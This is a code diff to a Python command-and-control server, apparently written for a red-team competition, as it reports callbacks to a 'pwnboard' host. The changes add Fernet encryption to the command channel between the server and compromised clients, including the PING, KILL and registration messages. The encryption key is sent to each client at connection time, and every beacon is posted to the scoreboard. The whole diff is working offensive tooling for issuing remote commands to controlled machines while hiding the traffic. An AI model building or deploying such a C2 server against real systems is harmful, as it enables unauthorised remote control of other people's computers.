@@ -4,12 +4,16 @@ import time
 import ipaddress
 import fnmatch
 from datetime import datetime
+import requests
+from cryptography.fernet import Fernet
+import base64
 #import copy
 
 HOST='localhost'
 LISTEN_PORT=9999
 BUFFER_SIZE=4096
 TIMEOUT_TIME=10
+PWNHOST=''
 
 '''
 Netflow Diagram
@@ -46,6 +50,7 @@ clients_info = {}
 #clients_dead_info = {}
 clients_lock = threading.Lock()
 connections_counter = 0
+key = Fernet.generate_key()
 
 class style():
   RED       = '\033[31m'
@@ -55,7 +60,7 @@ class style():
   RESET     = '\033[0m'
 
 def main():
-
+    
     # Setup the server
     server_sock = socket.socket()
     server_sock.bind((HOST,LISTEN_PORT))
@@ -73,9 +78,33 @@ def main():
     while True:
         command_menu()
 
+def encrypt_string(msg):
+    global key
+    cipher = Fernet(key)
+    encrypted = cipher.encrypt(msg.encode())
+    return base64.b64encode(encrypted).decode()
+
+def decrypt_string(msg):
+    global key
+    cipher = Fernet(key)
+    decrypted = base64.b64decode(msg)
+    return cipher.decrypt(decrypted).decode()
+
 def get_time():
     return datetime.now().strftime("%m/%d/%Y %H:%M:%S") #19 chars
 
+def send_pwnboard(ip):
+    #ip = data.split("-")[0].strip()
+    host = PWNHOST
+    data = {"ip": ip, "type": "andrew_pyc2"}
+
+    try:
+        response = requests.post(host, json=data, timeout=3)
+        return True
+    except Exception as E:
+        print(E)
+        return False
+    
 # Source must call this inside a with clients_lock
 def print_pretty(show_dead=True):
     global clients_info
@@ -113,7 +142,7 @@ def search_clients(clients,pattern,alive_only=False):
     matched = []
     for client in clients.values():
         try:
-            if fnmatch.fnmatch(client['ipaddr'], pattern): #or fnmatch.fnmatch(client['hostname'], pattern):
+            if fnmatch.fnmatch(client['ipaddr'], pattern) or fnmatch.fnmatch(client['hostname'], pattern):
                 if alive_only:
                     if client["alive"]:
                         matched.append(client)
@@ -160,9 +189,12 @@ def send_command_client(client,command,responses,response_lock):
     try:
         client_ip = client["ipaddr"]
         client_socket = client["cs"]
-        client_socket.send(f"{command}".encode())
+        #client_socket.send(f"{command}".encode())
+        client_socket.send(encrypt_string(command).encode())
         response = client_socket.recv(BUFFER_SIZE).decode()
+        response = decrypt_string(response)
         client["callback"] = get_time()
+        send_pwnboard(client["ipaddr"])
         with response_lock:
             responses[client_ip] = response
     except KeyError as e:
@@ -306,11 +338,14 @@ def ping_client(client, noisy=False):
     ip = client["ipaddr"]
     try:
         cs.settimeout(TIMEOUT_TIME) # leftover from previous work
-        cs.send(b"PING")
+        #cs.send(b"PING")
+        cs.send(encrypt_string("PING").encode())
         response = cs.recv(BUFFER_SIZE)
+        response = decrypt_string(response)
         if not response: # empty
             raise ValueError("Received empty response")
         client["callback"] = get_time()
+        send_pwnboard(client["ipaddr"])
         cs.settimeout(TIMEOUT_TIME) # leftover from previous work
         if noisy:
             print(f"{style.GREEN}Client {ip} is alive{style.RESET}")
@@ -349,11 +384,14 @@ def handle_connections(server_sock):
 
 # New version of handle client that doesnt listen continuously after registration
 def handle_client2(client_sock,nat_addr):
+    global key
     global connections_counter
     client_sock.settimeout(TIMEOUT_TIME)
 
     try:
+        client_sock.send(f"INIT {key}".encode())
         received_msg = client_sock.recv(BUFFER_SIZE).decode()
+        received_msg = decrypt_string(received_msg)
     except Exception as e:
         print(f"Failed to receive message from {nat_addr}: {e}")
         client_sock.close()
@@ -368,7 +406,8 @@ def handle_client2(client_sock,nat_addr):
 
         if len(parts) != 5:
             print(f"Malformed REG message from {nat_addr}: {received_msg}")
-            client_sock.send(b"KILL")
+            #client_sock.send(b"KILL")
+            client_sock.send(encrypt_string("KILL").encode())
             client_sock.close()
             return
 
@@ -388,11 +427,13 @@ def handle_client2(client_sock,nat_addr):
             if data[0] in clients_info:
                 print(f"Client {data[0]} appears to already be connected. Killing old client...")
                 old_info = clients_info[client_info["ipaddr"]]
-                old_info["cs"].send(b"KILL")
+                #old_info["cs"].send(b"KILL")
+                old_info["cs"].send(encrypt_string("KILL").encode())
                 #clients_info.pop(client_info["ipaddr"]) #no need as it gets replaced
             clients_info[client_info["ipaddr"]] = client_info
         
-        client_sock.send(b"REG_R")
+        #client_sock.send(b"REG_R")
+        client_sock.send(encrypt_string("REG_R").encode())
 
         # Do not listen for further messages, as that will complicate the other parts of this program
         
@@ -409,6 +450,7 @@ def handle_client(client_sock,addr,real_addr): #real addr is a new copy so dont 
     while True:
         try:
             received_msg = client_sock.recv(BUFFER_SIZE).decode() # TODO sending kill makes this error 10038 an operation was attempted on something that is not a socket
+            received_msg = decrypt_string(received_msg)
             with clients_lock:
                 clients_info[real_addr]["callback"] = get_time()
         except ConnectionResetError:
